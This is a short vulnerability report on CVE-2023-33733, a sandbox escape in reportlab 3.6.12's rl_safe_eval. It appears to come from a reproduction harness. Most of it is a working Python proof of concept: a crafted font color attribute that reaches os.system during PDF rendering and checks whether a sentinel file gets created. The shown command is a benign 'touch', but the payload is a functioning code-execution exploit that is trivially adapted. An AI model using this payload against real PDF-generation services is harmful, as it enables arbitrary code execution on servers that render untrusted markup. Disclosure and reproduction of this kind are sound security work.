report.title: rl_safe_eval sandbox escape in reportlab
report.body:
I found a rl_safe_eval sandbox escape vulnerability in reportlab 3.6.12.

Rl_safe_eval sandbox escape: a crafted color attribute is eval'd as python during pdf render.

Tracked as CVE-2023-33733 (GHSA-p4cc-jw44-wc86).

Proof of concept:

```python
import os, tempfile
from reportlab.platypus import SimpleDocTemplate, Paragraph
from reportlab.lib.styles import getSampleStyleSheet
sentinel = os.path.join(tempfile.gettempdir(), "slopgate_reportlab")
try: os.remove(sentinel)
except OSError: pass
payload = ("<para><font color=\"[[[getattr(pow, Word('__globals__'))['os']"
           ".system('touch %s') for Word in [orgTypeFun('Word',(str,),"
           "{'mutated':1,'startswith':lambda self,x:1==0,"
           "'__eq__':lambda self,x:self.mutate() and self.mutated<0 and str(self)==x,"
           "'mutate':lambda self:{setattr(self,'mutated',self.mutated-1)},"
           "'__hash__':lambda self:hash(str(self))})]] "
           "for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'\">"
           "x</font></para>") % sentinel
doc = SimpleDocTemplate(os.path.join(tempfile.gettempdir(), "slopgate_out.pdf"))
try: doc.build([Paragraph(payload, getSampleStyleSheet()["Normal"])])
except Exception as e: print("raised:", type(e).__name__)
print("SLOPGATE:REPRODUCED" if os.path.exists(sentinel) else "SLOPGATE:NOT_REPRODUCED")
```
